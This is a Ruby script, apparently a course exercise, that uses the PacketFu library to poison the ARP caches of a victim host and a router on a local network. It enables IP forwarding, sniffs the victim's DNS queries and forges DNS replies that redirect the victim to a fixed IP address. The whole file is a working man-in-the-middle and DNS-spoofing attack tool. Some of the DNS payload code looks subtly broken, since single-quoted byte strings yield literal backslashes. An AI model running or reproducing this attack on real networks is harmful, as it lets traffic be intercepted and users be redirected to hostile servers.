#!/usr/bin/ruby

# encoding: ASCII-8BIT
require 'packetfu'
require 'rubygems'
require 'thread'

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread. 

# Global Variables

@attackerAddress = 		'192.168.0.15'						# MITM IP Address
#@victimAddress = 		'192.168.0.16'						# Target IP Address
@victimAddress =		'192.168.0.21'
@routerAddress = 		'192.168.0.100'						# Router IP Address

@attackerMAC =			'78:2b:cb:a3:da:ef'					# MITM MAC Address
#@victimMAC = 			'78:2b:cb:a3:e9:71'					# Target MAC Address
@victimMAC = 			'78:2b:cb:96:b7:92'
@routerMAC = 			'00:1a:6d:38:15:ff'					# Router MAC Address

# Our Interface, hardcoded to eliminate weird lookup errors
@interface = "em1"
@config = PacketFu::Utils.whoami?(:iface => @interface)

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = 		@attackerMAC              
arp_packet_target.eth_daddr = 		@victimMAC	            
arp_packet_target.arp_saddr_mac = 	@attackerMAC          
arp_packet_target.arp_daddr_mac = 	@victimMAC		    
arp_packet_target.arp_saddr_ip = 	@routerAddress         
arp_packet_target.arp_daddr_ip = 	@victimAddress         
arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = 		@attackerMAC       		
arp_packet_router.eth_daddr = 		@routerMAC      			
arp_packet_router.arp_saddr_mac = 	@attackerMAC   
arp_packet_router.arp_daddr_mac = 	@routerMAC   
arp_packet_router.arp_saddr_ip = 	@victimAddress         
arp_packet_router.arp_daddr_ip = 	@routerAddress	        
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

def arpSpoof(arp_packet_target,arp_packet_router)
	# Send out both packets
	puts "Spoofing...."
	caught=false
	while caught==false do
		sleep 1
		arp_packet_target.to_w(@interface)
		arp_packet_router.to_w(@interface)
	end
end

def packetSniffing
	# Sniff packets with our filter.
	filter = "udp and port 53 and src " + @victimAddress
	puts "Filter: " + filter
	capture = PacketFu::Capture.new(
		:iface => @interface, 
		:start => true, 
		:promisc => true, 
		:filter => filter, 
		:save => true)
							
	# Find DNS packets
	# puts "Beginning of finding DNS packets"
	capture.stream.each do |pkt|
		# Ensure that we're capable of parsing the packet. 
		# If we can, ensure that we parse it.
		# puts "Inside the foreach loop"
		if PacketFu::UDPPacket.can_parse?(pkt) then
			# puts "Parsing packets..." 
			packet = PacketFu::Packet.parse(pkt)
			
			# puts "Checking if it's a query..."
			dnsQueryPkt = packet.payload[2].unpack('h*SS')[0].chr + packet.payload[3].unpack('h*SS')[0].chr
			# puts dnsQueryPkt
			if dnsQueryPkt == '10' then
				
				# Get the domain name into a human-legible format
				domainName = getDomainName(packet.payload[12..-1])
				if domainName == nil then
					puts "Empty domain field. Continuing..."
					next
				end
				
				puts "DNS Request for: " + domainName
				
				sendResponsePkt(packet, domainName)
			end
		end
	end
end

def sendResponsePkt(packet, domainName)
        
	# Convert the IP address
	tester = "8.20.73.150"
	rawIP = tester.split(".");
	ipSplit = [rawIP[0].to_i, rawIP[1].to_i, rawIP[2].to_i, rawIP[3].to_i].pack("C*")
	
	# Create the UDP packet
	response = PacketFu::UDPPacket.new(:config => @config)
	
	response.udp_src = 	packet.udp_dst
	response.udp_dst = 	packet.udp_src
	response.ip_saddr = 	packet.ip_daddr
	response.ip_daddr = 	@victimAddress
	response.eth_daddr = 	@victimMAC
	
	# Transaction ID	
	response.payload = packet.payload[0, 2]
	
	
	#response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
	
	response.payload += '\x81\x80' + '\x00\x01' + '\x00\x01'
	response.payload += '\x00\x00' + '\x00\x00'
	
	# Domain name
	tester.split(".").each do |section|
		response.payload += section.length.chr
		response.payload += section
	end

	# Set more default values
	response.payload += '\x00\x00\x01\x00' + '\x01\xc0\x0c\x00'
	response.payload += '\x01\x00\x01\x00' + '\x00\x00\xc0\x00' + '\x04'
	
	# IP
	response.payload += ipSplit
	
	# Calculate the packet
	response.recalc
	
	# Send the packet out
	response.to_w(@interface)
	# send(response, @interface)
end

def getDomainName(rawDomain)
	domainName = ""
	while true
		
		# Get the length of the next section of the domain name
		# length = rawDomain[0].unpack('H*')[0].to_i
		length = rawDomain[0].unpack('H*SS')[0].to_i
		if length == 0 then
			# For BIG ENDIAN
			temp = domainName.split(".")
			reversed = temp.reverse
			puts domainName
			domainName = (reversed.join(".")).to_s;
			puts domainName
			# We have all the sections, so send it back
			return domainName = domainName[0, domainName.length - 1]
		elsif length != 0 then
			# Copy the section of the domain name over, kinda like casting :)
			domainName += rawDomain[1, length] + "."
			rawDomain = rawDomain[length + 1..-1]
		else
			# Malformed packet!
			return nil
		end
	end
end

begin
	# Run our ArpSpoof now to set up for DNS Spoof
	puts "Starting ArpSpoof now..."
	@pid = fork do
		Signal.trap("INT") { `echo 0 > /proc/sys/net/ipv4/ip_forward`; exit }
		arpSpoof(arp_packet_target, arp_packet_router)
	end
	
	# Clean exit, please
	Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
	
	# Start DNS Spoofing
	puts "Starting DNS Spoof now..."
	caught = false
	while caught == false do
		packetSniffing
		Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
	end

	rescue Interrupt
	puts "Spoofing stopped by interrupt signal"
	`echo 0 > /proc/sys/net/ipv4/ip_forward`
	exit 0
end
